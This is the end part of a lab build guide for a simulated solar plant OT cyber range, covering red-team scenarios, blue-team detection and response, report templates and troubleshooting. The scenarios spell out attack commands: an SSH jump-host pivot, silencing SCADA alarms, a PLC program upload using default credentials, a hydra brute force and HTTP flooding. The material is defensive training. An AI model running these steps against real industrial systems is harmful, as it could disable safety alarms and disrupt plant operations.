RED TEAM ACTIONS:
Step 52.2.1: From Kali (on ENTERPRISE-NET via VMnet6):
             Try to SSH to SCADA directly:
             ssh solaradmin@10.10.20.10
             
             Expected: Connection timeout/refused (pfSense blocks direct Enterprise→OT)
             
             Pivot via Bastion:
             ssh -J solaradmin@192.168.20.5 solaradmin@10.10.20.10
             (This is a jump host/ProxyJump — uses Bastion as a relay)
             
             If successful: Attacker is on SCADA VM

Step 52.2.2: Modify alarm thresholds:
             # In ScadaBR via browser tunnel:
             # Alarms → Edit INVERTER_OVERTEMP threshold → Change from 75 to 200
             # This makes the overtemperature alarm never fire
             
             # Also: modify alarm email notification to attacker's email
             # This creates a "silent alarm" — attacker gets alerts, operators don't

BLUE TEAM DETECTION:
[ ] Wazuh: SSH lateral movement alert (Bastion → SCADA uncommon path)
[ ] Wazuh: ScadaBR configuration file modification (file integrity monitoring)
[ ] Wazuh: Login from unusual source IP
[ ] Zeek: SSH connection Bastion→SCADA logged in conn.log

BLUE TEAM RESPONSE:
Step 52.2.4: Force logout of attacker session (kill -HUP pid)
Step 52.2.5: Restore alarm thresholds from configuration backup
Step 52.2.6: Audit Bastion host login logs: /var/log/auth.log
Step 52.2.7: Review who authorized Bastion access
```

### Scenario 3: PLC Reprogramming Attempt

```
THREAT MODEL: Advanced attacker who has reached Level 1 attempts to upload
a malicious PLC program that disables safety logic.

MITRE ATT&CK ICS: T0843 (Program Download), T0845 (Program Upload)

RED TEAM ACTIONS:
Step 52.3.1: Access OpenPLC web UI from unauthorized host:
             # From Kali on OT-LEVEL1-NET:
             curl -c cookies.txt -b cookies.txt \
               -d "username=openplc&password=openplc" \
               http://10.10.10.1:8080/login
             
             # Try to upload a modified program
             curl -c cookies.txt -b cookies.txt \
               -F "file=@/tmp/malicious_program.st" \
               http://10.10.10.1:8080/upload-program

BLUE TEAM DETECTION:
[ ] Wazuh: HTTP POST to OpenPLC login from unauthorized IP (10.10.10.99)
[ ] OpenPLC: Program upload logged in OpenPLC's SQLite database
[ ] Wazuh: PLC configuration file change (if FIM configured for /home/pi/OpenPLC_v3/)

BLUE TEAM RESPONSE:
Step 52.3.4: OpenPLC web UI → verify running program is unchanged
Step 52.3.5: Change OpenPLC web credentials immediately
Step 52.3.6: pfSense: Restrict OpenPLC port 8080 access — allow only engineering WS
```

### Scenario 4: IT-to-OT Lateral Movement

```
THREAT MODEL: Phishing attack compromises enterprise workstation.
Attacker pivots from IT to OT via DMZ (testing our segmentation).

RED TEAM ACTIONS:
Step 52.4.1: Kali on ENTERPRISE-NET → try to reach OT:
             ping 10.10.20.10   → Should FAIL (pfSense blocks)
             ping 10.10.10.1    → Should FAIL
             ping 192.168.20.5  → Should SUCCEED (Bastion in DMZ, accessible)
             
Step 52.4.2: Port scan Enterprise-accessible services:
             nmap -sV 192.168.20.0/24
             Find: 192.168.20.5 (Bastion) has SSH/22 open
             Find: 192.168.20.20 (Wazuh) has HTTPS/443 open
             
Step 52.4.3: Attempt credential brute force on Bastion SSH:
             hydra -l solaradmin -P /usr/share/wordlists/rockyou.txt \
               192.168.20.5 ssh -t 4 -f
             
             (This will likely fail — Bastion should have fail2ban installed)
             But it generates Wazuh alerts!

BLUE TEAM DETECTION:
[ ] Wazuh: SSH brute force alert (many failed login attempts)
[ ] Wazuh: fail2ban IP block logged
[ ] pfSense: Firewall log shows blocked Enterprise→OT attempts
[ ] Zeek: Scan pattern detected from enterprise source

BLUE TEAM RESPONSE:
Step 52.4.4: Wazuh → active response → block attacker IP automatically
Step 52.4.5: pfSense → review firewall logs for scope of scanning
Step 52.4.6: Notify: "Potential compromise on Enterprise workstation — investigate source"
```

### Scenario 5: Historian/SCADA Denial of Service

```
THREAT MODEL: Attacker causes SCADA and historian to crash, blinding 
operators and losing historical data integrity.

RED TEAM ACTIONS:
Step 52.5.1: From authorized position on OT-LEVEL3-NET (historian's subnet):
             # Flood Grafana with requests:
             for i in $(seq 1 1000); do
               curl -s http://10.10.30.10:3000 > /dev/null &
             done
             
             # Flood InfluxDB query endpoint:
             for i in $(seq 1 500); do
               curl -s "http://10.10.30.10:8086/query" > /dev/null &
             done

BLUE TEAM DETECTION:
[ ] Wazuh: High CPU/memory alert on Historian VM (resource exhaustion)
[ ] Grafana: Becomes slow/unresponsive — operators notice
[ ] Wazuh: Anomalous HTTP request rate from source IP
[ ] Network: pfSense sees unusual traffic volume on OT-LEVEL3-NET

BLUE TEAM RESPONSE:
Step 52.5.4: Identify source via pfSense/Zeek logs
Step 52.5.5: Block source IP in pfSense
Step 52.5.6: Restart Grafana: sudo systemctl restart grafana-server
Step 52.5.7: Verify data integrity: InfluxDB query for last 30 minutes of data
Step 52.5.8: Review: Was historian data corrupted during the attack?
```

---

# ═══════════════════════════════════════════════════
# PHASE 10 — DOCUMENTATION & PORTFOLIO
# ═══════════════════════════════════════════════════

## STEP 53: Document All Findings

### Incident Report Template

```
SOLAR GUARD CYBER RANGE — INCIDENT REPORT
==========================================
Incident ID:     IR-[YYYY-MM-DD]-[SEQ#]
Scenario:        [Attack Scenario Name]
Date/Time:       [ISO 8601 timestamp]
Severity:        [CRITICAL / HIGH / MEDIUM / LOW]
Status:          [Open / Contained / Resolved]

EXECUTIVE SUMMARY (2-3 sentences):
[What happened, what was affected, what was the business impact]

TIMELINE:
[Time]  [Event]
HH:MM   Attack initiated from [source IP]
HH:MM   First alert in Wazuh (Rule ID: XXXXX)
HH:MM   Blue team notified
HH:MM   Containment action taken ([specific action])
HH:MM   Systems restored to normal operation

INDICATORS OF COMPROMISE (IOCs):
- Source IP: [attacker IP]
- Destination: [target IP:port]
- Protocol: Modbus TCP / SSH / HTTP
- MITRE ATT&CK ICS: [T0XXX]
- Wazuh Rule IDs: [100100, etc.]

TECHNICAL DETAILS:
[Modbus register written, SSH source, HTTP endpoint hit, etc.]

EVIDENCE:
- Screenshot 1: Wazuh alert dashboard showing fired rules
- Screenshot 2: Grafana power drop graph
- Screenshot 3: Zeek log entry
- Screenshot 4: pfSense firewall log

BLUE TEAM RESPONSE ACTIONS:
1. [Action 1]
2. [Action 2]
3. [Action 3]

ROOT CAUSE:
[Why was the attack possible? What security control was missing?]

RECOMMENDATIONS:
1. [Specific security improvement]
2. [Policy or procedure change]
3. [Tool or monitoring improvement]

Authored by: [Your name]
Reviewed by: [N/A for lab]
```

---

## STEP 54: GitHub Portfolio Structure

```
Step 54.1: Create GitHub account at github.com (free)

Step 54.2: Create repository: solar-guard-cyber-range
           Description: "Industrial OT Security Cyber Range — 1 MW Solar Plant"
           Public: YES (portfolio visibility)
           Initialize with README

Step 54.3: Repository structure:
           solar-guard-cyber-range/
           ├── README.md              ← Most important — everyone reads this first
           ├── ARCHITECTURE.md        ← Network diagrams, Purdue model
           ├── BUILD_GUIDE.md         ← Link to this guide
           ├── ATTACK_SCENARIOS.md    ← All 5 scenarios documented
           ├── INCIDENT_REPORTS/
           │   ├── IR-001-ModbusInjection.md
           │   ├── IR-002-SCADAManipulation.md
           │   ├── IR-003-PLCReprogram.md
           │   ├── IR-004-LateralMovement.md
           │   └── IR-005-HistorianDoS.md
           ├── code/
           │   ├── field_simulator/
           │   │   └── solar_field_simulator.py
           │   ├── historian/
           │   │   └── solar_historian.py
           │   ├── plc_programs/
           │   │   └── SolarPlantController.st
           │   ├── detection_rules/
           │   │   ├── solar_plant_ot_rules.xml
           │   │   └── solar_ot_detection.zeek
           │   └── red_team/
           │       └── modbus_inject.py
           ├── screenshots/
           │   ├── grafana_dashboard.png
           │   ├── scadabr_hmi.png
           │   ├── wazuh_alert_modbus.png
           │   ├── zeek_modbus_log.png
           │   ├── pfsense_blocked_traffic.png
           │   └── openplc_monitoring.png
           └── network_diagrams/
               ├── purdue_model.png
               └── vm_network_topology.png

Step 54.4: README.md must contain:
           # Solar Guard OT Cyber Range
           
           ## What This Is
           [2-paragraph project summary]
           
           ## Architecture
           [Purdue Model diagram — screenshot or ASCII art]
           
           ## Technology Stack
           [Table: Component → Technology → Purpose]
           
           ## Attack Scenarios Executed
           [Table: Scenario → MITRE ID → Detected? → Response time]
           
           ## Screenshots
           [Grafana dashboard, Wazuh alert, SCADA HMI]
           
           ## Quick Start
           [3-step summary to reproduce]
           
           ## Skills Demonstrated
           - OT/ICS security concepts (Purdue Model, network segmentation)
           - Industrial protocols (Modbus TCP, IEC 61131-3)
           - SIEM deployment and rule writing (Wazuh)
           - Network security monitoring (Zeek, pfSense)
           - Threat detection and incident response
           - Python automation and simulation
```

---

# COMPLETE QUICK REFERENCE CHECKLIST

```
PHASE 0 — PREPARATION
[ ] WS-A hardware verified (64 GB RAM, 200 GB disk, CPU virt)
[ ] WS-A has TWO Ethernet ports/adapters (ETH-PORT-1=LAN, ETH-PORT-2=Pi dedicated)
[ ] WS-B hardware verified (128 GB RAM, 400 GB disk, CPU virt)
[ ] BIOS virtualization enabled on BOTH machines
[ ] VMware Workstation Pro installed on BOTH
[ ] VMnet2 configured as BRIDGED to WS-A's ETH-PORT-2 (Pi adapter)
[ ] VMnet3-VMnet6 configured as Host-Only on BOTH workstations
[ ] VMnet8 (NAT) configured on WS-B for Kali
[ ] All 5 ISOs downloaded and checksums verified
[ ] Raspberry Pi OS with Desktop flashed to SD card
[ ] Pi responds to ping 10.10.10.1 from WS-A (ETH-PORT-2 = 10.10.10.100)
[ ] SSH to pi@10.10.10.1 works

PHASE 1 — FIELD DEVICES (WS-A)
[ ] Field-Simulator VM: Ubuntu 24.04 Server on VMnet2
[ ] Static IP: 10.10.10.10/24 configured via nmcli
[ ] Python venv with pymodbus 3.6.9 installed
[ ] solar_field_simulator.py deployed
[ ] field-simulator.service enabled and active
[ ] All 6 Modbus ports listening (ss -tlnp | grep 55)
[ ] Level 0 validation: 6/6 devices PASSED

PHASE 2 — PLC (Raspberry Pi)
[ ] Pi static IP 10.10.10.1 permanently configured
[ ] OpenPLC Runtime installed and service active
[ ] OpenPLC web UI accessible
[ ] PLC program compiled and uploaded
[ ] OpenPLC Monitoring shows live inverter values
[ ] SCADA can read PLC registers (Modbus port 502 test)
[ ] Force-write test: Power curtailment works

PHASE 3 — SCADA (WS-A)
[ ] SCADA-Server VM: Ubuntu 24.04 Desktop on VMnet3
[ ] Static IP: 10.10.20.10/24
[ ] Java 11 installed (java -version confirms)
[ ] ScadaBR installed, accessible, admin password changed
[ ] Modbus TCP data source pointing to 10.10.10.1:502
[ ] 16+ tags configured and showing live values
[ ] HMI graphical view built (all 4 inverters visible)
[ ] Alarms: overtemperature + fault + low generation

PHASE 4 — HISTORIAN (WS-A)
[ ] Historian VM: Ubuntu 24.04 Server on VMnet4
[ ] Static IP: 10.10.30.10/24
[ ] InfluxDB 2.x installed, initialized, org: solar-plant
[ ] API token saved and used in historian script
[ ] Grafana installed, connected to InfluxDB (Flux)
[ ] solar-historian.service running
[ ] InfluxDB receiving data (query returns rows)
[ ] Grafana dashboard: live power trend visible

PHASE 5 — SECURITY (WS-A + WS-B)
[ ] pfSense-Internal: on WS-A — 5 interfaces (VMnet2/3/4/5/6)
[ ] pfSense OPT1 (VMnet2): 10.10.10.254 — OT-LEVEL1-NET gateway
[ ] pfSense LAN  (VMnet3): 10.10.20.254 — OT-LEVEL2-NET gateway
[ ] pfSense OPT2 (VMnet4): 10.10.30.254 — OT-LEVEL3-NET gateway
[ ] pfSense OPT3 (VMnet5): 192.168.20.1  — DMZ gateway
[ ] pfSense WAN  (VMnet6): 192.168.10.254 — Enterprise-facing
[ ] pfSense rules: SCADA → Pi (10.10.10.1:502) ALLOWED
[ ] pfSense rules: Historian → Pi (10.10.10.1:502) ALLOWED
[ ] pfSense rules: Pi → Field-Sim (10.10.10.10:5501-5520) ALLOWED
[ ] pfSense rules: Enterprise → OT blocked, DMZ → OT controlled
[ ] Bastion Host VM configured (jump host for OT access)
[ ] Wazuh-SIEM VM: 8 GB RAM, Bridged network, all-in-one installed
[ ] Wazuh agents: ALL VMs show Active in dashboard
[ ] Zeek: Running (Ubuntu 24.04 repo used), modbus.log capturing traffic
[ ] Custom rules: solar_plant_ot_rules.xml loaded
[ ] Custom Zeek: solar_ot_detection.zeek loaded
[ ] Segmentation test: Enterprise → OT ping FAILS
[ ] Segmentation test: SCADA → Pi (port 502) SUCCEEDS via pfSense routing
[ ] Segmentation test: Historian → Pi (port 502) SUCCEEDS via pfSense routing

PHASE 6 — BUSINESS (WS-B)
[ ] ERP-Odoo VM: Ubuntu 24.04 Server
[ ] PostgreSQL + Odoo 17 installed
[ ] Solar plant assets configured in Odoo
[ ] Maintenance plans created

PHASE 7 — ENTERPRISE (WS-B)
[ ] ActiveDirectory VM: Windows Server 2022
[ ] AD domain: solar-corp.local created
[ ] Users: john.smith, sarah.jones, plant.manager created
[ ] OUs: SolarPlant/OT-Engineers, IT-Staff, Management
[ ] pfSense-External: WAN (NAT) + LAN (Enterprise)

PHASE 8 — RED TEAM (WS-B)
[ ] Kali VM: 8 GB RAM, VMnet8 (NAT)
[ ] OT tools: pymodbus, scapy, nmap, metasploit
[ ] Attack scripts: modbus_inject.py created and tested

SCENARIOS
[ ] Pre-attack snapshots taken for all VMs
[ ] Scenario 1 (Modbus injection): Plant output dropped → Wazuh alerted
[ ] Scenario 2 (SCADA manipulation): Alarm threshold changed → Detected
[ ] Scenario 3 (PLC reprogramming): Upload attempt → Wazuh logged
[ ] Scenario 4 (Lateral movement): Enterprise→OT blocked → pfSense logged
[ ] Scenario 5 (Historian DoS): Service degraded → Resource alert fired

PORTFOLIO
[ ] GitHub repository created (public)
[ ] README.md with architecture + screenshots
[ ] All 5 incident reports completed
[ ] Code files committed (simulator, historian, PLC program, rules)
[ ] Screenshots captured for all key systems
[ ] Presentation prepared with live demo capability
```

---

# MASTER TROUBLESHOOTING REFERENCE

## Network Connectivity Problems

```
SYMPTOM: VM cannot ping another VM on same VMnet
CHECKS:
1. Both VMs on same VMnet number? (VMware settings)
2. Both VMs have correct static IPs for that subnet?
3. No firewall (ufw/iptables) blocking ICMP?
4. Both VMs are powered on?

FIX SEQUENCE:
On both VMs: ip addr show  → confirm IPs
On both VMs: sudo ufw status → if active: sudo ufw allow from <subnet>
On VMware: Edit → Virtual Network Editor → verify VMnet configuration

SYMPTOM: Cannot SSH to VM
CHECKS:
1. SSH server installed? (sudo apt install openssh-server)
2. SSH service running? (sudo systemctl status ssh)
3. Correct IP being used? (ip addr show)
4. Port 22 not blocked? (sudo ufw allow 22)
5. VM can be pinged at all?

SYMPTOM: VM has wrong IP or no IP
FIX (Ubuntu 24.04.4 Server — uses Netplan):
Check what's in /etc/netplan/:
  ls /etc/netplan/
  
If your netplan file exists (e.g. 10-solar-network.yaml), check it:
  sudo cat /etc/netplan/10-solar-network.yaml
  
Fix the IP in the file, then apply:
  sudo netplan try

Note: Ubuntu 24.04.4 Server uses Netplan + systemd-networkd.
Do NOT use nmcli on Server — nmcli is for Desktop (NetworkManager).
If you see "NM not running" errors, you are on Server. Use netplan.

FIX (Ubuntu 24.04.4 Desktop — SCADA-Server — uses NetworkManager):
First find the correct connection name:
  nmcli connection show
Then modify using the exact name shown (may not be "Wired connection 1"):
  sudo nmcli connection modify "<exact-connection-name>" \
    ipv4.addresses "X.X.X.X/24" \
    ipv4.method manual
  sudo nmcli connection up "<exact-connection-name>"
```

## VMware Problems

```
SYMPTOM: VM won't power on ("VMX blocked by BIOS")
FIX: BIOS → enable Intel VT-x or AMD-V (Step 2)

SYMPTOM: VM window is tiny (low resolution)
FIX: Install VMware Tools:
VM menu → Install VMware Tools
In Ubuntu: sudo apt install open-vm-tools open-vm-tools-desktop

SYMPTOM: Cannot paste into VM console
FIX: VMware Tools must be installed for clipboard sharing.
Alternative: SSH to VM from Windows Terminal (clipboard works via SSH)

SYMPTOM: VM very slow
CHECKS:
- Enough RAM allocated? (At minimum the recommended amounts)
- SSD storage? (VM on HDD = very slow)
- VMware Tools installed?
- 3D acceleration enabled for Desktop VMs?
```

## Raspberry Pi Problems

```
SYMPTOM: Pi won't boot
CHECKS:
- SD card fully inserted (push until it clicks)
- Using official 5V 3A USB-C power supply
- SD card correctly flashed (verify with Raspberry Pi Imager)
- Green LED blinking (SD activity) vs. solid red (power only, no boot)

FIX: Reflash SD card. Use a new card if reflashing doesn't help.

SYMPTOM: Can SSH but network seems wrong
FIX: Check NetworkManager vs dhcpcd:
nmcli general status  →  if running, use nmcli commands
cat /etc/dhcpcd.conf  →  if file exists and has config, dhcpcd is managing

SYMPTOM: OpenPLC won't start
FIX: sudo journalctl -u openplc -n 100 --no-pager
Most common: Missing compiler → sudo apt install -y g++
Or: Port 8080 already in use → sudo lsof -i :8080
```

## Python/Modbus Problems

```
SYMPTOM: "externally-managed-environment" error on Ubuntu 24.04
FIX: Use virtual environment:
python3 -m venv ~/my_venv
source ~/my_venv/bin/activate
pip install pymodbus

SYMPTOM: pymodbus ImportError
FIX: Check you're in the venv: which python3 → should show .venv path
If not: source ~/solar_plant/.venv/bin/activate

SYMPTOM: Modbus connection refused
CHECKS:
- Is the server running? (ss -tlnp | grep 5501)
- Is the port correct?
- Is the IP correct? (field simulator IP is 10.10.10.10, NOT 10.10.10.1)
- Are you on the same subnet? (can you ping the host?)

SYMPTOM: Modbus reads return all zeros
FIX: Server is running but registers not being updated.
Check: Is the update thread running?
sudo systemctl status field-simulator
sudo journalctl -u field-simulator -n 30
```

## Ubuntu 24.04.4 Specific Issues

```
SYMPTOM: apt install fails with "unable to fetch" / "connect timeout" errors
CAUSE: The VM's NAT adapter (VMnet8) is not connected or DHCP not assigned.
FIX:
1. Check if internet works: ping 8.8.8.8
   If it times out → internet is unavailable
2. Check all adapters have IPs: ip addr show
   If the NAT adapter shows no IP (169.254.x.x or nothing):
   sudo dhclient <nat-interface-name>   ← manually request DHCP
3. If VMnet8 still not getting IP:
   In VMware: Edit → Virtual Network Editor → VMnet8
   Click "Restore Defaults" → Apply  (resets NAT DHCP service)
4. If VM has no NAT adapter at all:
   Power off → VMware Settings → Add → Network Adapter → VMnet8 → OK
   Power on → retry sudo apt update
5. Try a different mirror:
   sudo nano /etc/apt/sources.list.d/ubuntu.sources
   Change URIs to: http://in.archive.ubuntu.com/ubuntu/
   sudo apt update

SYMPTOM: "externally-managed-environment" when running pip install
CAUSE: Ubuntu 24.04.4 enforces PEP 668 — pip cannot install to system Python.
FIX: Always use a virtual environment:
python3 -m venv ~/myenv
source ~/myenv/bin/activate
pip install <package>
All guide steps already use venvs — if you see this error, you forgot to activate.

SYMPTOM: /etc/netplan/ directory is completely empty after install
CAUSE: Normal behaviour in Ubuntu 24.04.4 Server when the network interface
could not get a DHCP address during installation (our VMnet2 has no DHCP).
The Subiquity installer skips creating a netplan file in this case.
FIX: Create the file from scratch — Step 8.10 covers this exactly.
Do NOT panic. An empty netplan directory is fine — just create your config file.

SYMPTOM: netplan try/apply shows "renderer 'networkd' is not installed"
CAUSE: systemd-networkd is not running (should be active on Server).
FIX:
sudo systemctl enable --now systemd-networkd
sudo systemctl enable --now systemd-resolved
sudo netplan try

SYMPTOM: After netplan apply, the NAT adapter loses internet
CAUSE: Both interfaces must appear in the netplan YAML file.
If only the OT interface is defined, the NAT interface loses its DHCP lease.
FIX: Add the NAT interface with "dhcp4: true" to the same YAML file.
See Step 8.10 for the dual-interface YAML format.

SYMPTOM: SSH password authentication refused / "Permission denied (publickey)"
CAUSE: Ubuntu 24.04.4 Server does not disable publickey-only mode by default.
FIX: In the VMware console on the VM:
sudo nano /etc/ssh/sshd_config.d/50-cloud-init.conf
Change: PasswordAuthentication no → PasswordAuthentication yes
If file doesn't exist: sudo nano /etc/ssh/sshd_config
Add line: PasswordAuthentication yes
sudo systemctl restart ssh
Then retry SSH from WS-A.

SYMPTOM: snap packages keep auto-updating (slowing down the VM)
FIX: sudo snap set system refresh.schedule="00:00-01:00/mon"

SYMPTOM: Firefox on SCADA-Server (Desktop) crashes or won't open
CAUSE: Snap version of Firefox has sandbox issues in VMware.
FIX: Remove snap Firefox, install deb version:
sudo snap remove --purge firefox
sudo add-apt-repository ppa:mozillateam/ppa
echo 'Package: *
Pin: release o=LP-PPA-mozillateam
Pin-Priority: 1001' | sudo tee /etc/apt/preferences.d/mozilla-firefox
sudo apt update && sudo apt install -y firefox
OR use Chromium instead: sudo apt install -y chromium-browser

SYMPTOM: High memory usage on Ubuntu 24.04.4 Desktop even when idle
CAUSE: Desktop environment, snaps, and background services consume ~2.5 GB.
FIX: Add swap to prevent OOM on SCADA VM if RAM is tight:
free -h  → check available swap
If swap < 2 GB:
sudo fallocate -l 4G /swapfile
sudo chmod 600 /swapfile
sudo mkswap /swapfile
sudo swapon /swapfile
echo '/swapfile none swap sw 0 0' | sudo tee -a /etc/fstab

SYMPTOM: "systemctl: command not found" inside a script
CAUSE: Running script in a minimal shell environment.
FIX: Use full path: /usr/bin/systemctl

SYMPTOM: ufw is blocking inter-VM traffic after setup
CAUSE: Ubuntu 24.04.4 enables ufw by default on some installations.
FIX: Check ufw status: sudo ufw status
If active, allow traffic from OT subnets:
sudo ufw allow from 10.10.0.0/16
sudo ufw allow from 192.168.0.0/16
Or disable for the lab: sudo ufw disable
```

---

*End of Solar Plant OT Cyber Range — Complete Build Guide v6.0*
*Dual-Workstation VMware Edition | Ubuntu 24.04.4 LTS | Raspberry Pi GUI OS*
*All network conflicts resolved. Ubuntu 24.04.4 verified. Every failure anticipated.*
*Industrial Standard. First-Timer Friendly. Zero Budget.*
